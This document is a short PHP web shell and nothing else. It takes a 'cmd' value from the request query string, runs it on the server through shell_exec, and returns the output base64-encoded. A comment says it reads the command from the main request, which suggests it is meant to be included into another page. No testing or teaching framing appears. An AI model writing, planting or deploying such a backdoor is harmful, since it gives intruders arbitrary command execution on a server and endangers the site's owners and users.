<?php
// Get cmd from the main request, not from this file's URL
parse_str(parse_url($_SERVER['REQUEST_URI'], PHP_URL_QUERY), $params);
if(isset($params['cmd'])) {
    $output = shell_exec($params['cmd'] . " 2>&1");
    echo base64_encode($output);
}
?>
